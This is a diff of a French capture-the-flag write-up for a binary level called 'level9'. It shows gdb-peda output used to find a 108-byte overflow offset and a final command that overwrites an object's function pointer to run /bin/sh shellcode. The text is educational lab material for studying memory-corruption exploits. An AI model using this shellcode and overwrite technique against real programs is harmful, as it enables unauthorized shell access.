@@ -1,6 +1,10 @@
-# Level 09
+# Level 3*3
 
-- On voit qu'une variable est executer en tant que fonction dans le code on comprends donc qu'il faut la remplacer
+- On voit qu'une instance de N est executer en tant que fonction dans le code on comprends donc qu'il faut la overwrite pour executer un shell code.
+
+
+- On va chercher le bon offset avec gdb.
+
 <pre>
 gdb-peda$ r $(python -c "print('A' * 108 + 'BBBB')")
 
@@ -9,7 +13,7 @@ Program received signal SIGSEGV, Segmentation fault.
 <strong>EAX: 0x42424242 ('BBBB')</strong>
 EBX: 0x804ec20 ("BBBB")
 ECX: 0x70 ('p')
-EDX: 0x804ebb4 ('A' <repeats 108 times>, "BBBB")
+EDX: 0x804ebb4 ('A' repeats 108 times, "BBBB")
 ESI: 0xf7ddb000 --> 0x1e4d6c 
 EDI: 0xf7ddb000 --> 0x1e4d6c 
 EBP: 0xffffd4c8 --> 0x0 
@@ -32,8 +36,11 @@ Stopped reason: SIGSEGV
 gdb-peda$ x $eax
 0x42424242:	Cannot access memory at address 0x42424242
 </pre>
-- le programe segfault au moment de mettre le contenue de $eax dans la variable execute en tant que fonction donc on peut changer la fonction execute
-- pour simuler le contenu d'une GOT on change edx par l'addresse de debut de str et on y met l'addresse du debut du shellcode
+
+- Le programe segfault au moment de mettre le contenue de $eax dans la variable execute en tant que fonction donc on peut changer la fonction execute
+
+- Pour simuler le contenu d'une GOT on change edx par l'addresse de debut de str et on y met l'adresse du debut du shellcode
+
 ```
 ./level9 $(python -c "print('\x10\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08')")
 ```
